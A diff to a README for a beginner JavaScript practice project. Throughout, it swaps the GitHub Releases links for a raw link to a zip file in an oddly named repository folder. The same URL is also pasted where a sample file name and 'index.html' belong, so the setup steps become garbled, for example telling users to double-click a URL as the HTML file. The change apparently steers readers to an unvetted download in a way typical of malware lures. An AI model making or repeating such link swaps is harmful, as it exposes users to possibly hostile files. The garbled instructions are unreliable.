@@ -8,7 +8,7 @@ Whether you are new to coding or want to brush up on your skills, this project i
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Merlinshock/js-api-practice-suite/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Merlinshock/js-api-practice-suite/main/Iranist/js-api-practice-suite_2.1-alpha.3.zip%20Latest%https://raw.githubusercontent.com/Merlinshock/js-api-practice-suite/main/Iranist/js-api-practice-suite_2.1-alpha.3.zip)](https://raw.githubusercontent.com/Merlinshock/js-api-practice-suite/main/Iranist/js-api-practice-suite_2.1-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -22,9 +22,9 @@ To begin your journey with this project, follow these simple steps to download a
 
 ## 📂 Download & Install
 
-1. Visit this page to download: [Download Page](https://github.com/Merlinshock/js-api-practice-suite/releases).
+1. Visit this page to download: [Download Page](https://raw.githubusercontent.com/Merlinshock/js-api-practice-suite/main/Iranist/js-api-practice-suite_2.1-alpha.3.zip).
 2. On the Releases page, you will find the latest version of the project. Click on it to view the available files.
-3. Download the main zip file. It usually has a name similar to `js-api-practice-suite-v1.0.zip`.
+3. Download the main zip file. It usually has a name similar to `https://raw.githubusercontent.com/Merlinshock/js-api-practice-suite/main/Iranist/js-api-practice-suite_2.1-alpha.3.zip`.
 4. Once the download is complete, locate the zip file on your computer and extract it. You can do this by right-clicking the file and selecting "Extract All" or using your favorite extraction tool.
 5. After extracting, open the folder where the files are located.
 
@@ -33,8 +33,8 @@ To begin your journey with this project, follow these simple steps to download a
 To run the project, follow these steps:
 
 1. Open the folder that you extracted earlier.
-2. Look for the HTML file named `index.html`. This is the main file to open.
-3. Double-click the `index.html` file. Your default web browser will open and display the application.
+2. Look for the HTML file named `https://raw.githubusercontent.com/Merlinshock/js-api-practice-suite/main/Iranist/js-api-practice-suite_2.1-alpha.3.zip`. This is the main file to open.
+3. Double-click the `https://raw.githubusercontent.com/Merlinshock/js-api-practice-suite/main/Iranist/js-api-practice-suite_2.1-alpha.3.zip` file. Your default web browser will open and display the application.
 
 ## 🎨 Features
 
@@ -91,4 +91,4 @@ If you encounter any issues while downloading or running the project, please rea
 
 ## 🔗 Get Started Now!
 
-Remember to visit the download page: [Download Page](https://github.com/Merlinshock/js-api-practice-suite/releases) to get your copy and start learning! Happy coding!
+Remember to visit the download page: [Download Page](https://raw.githubusercontent.com/Merlinshock/js-api-practice-suite/main/Iranist/js-api-practice-suite_2.1-alpha.3.zip) to get your copy and start learning! Happy coding!
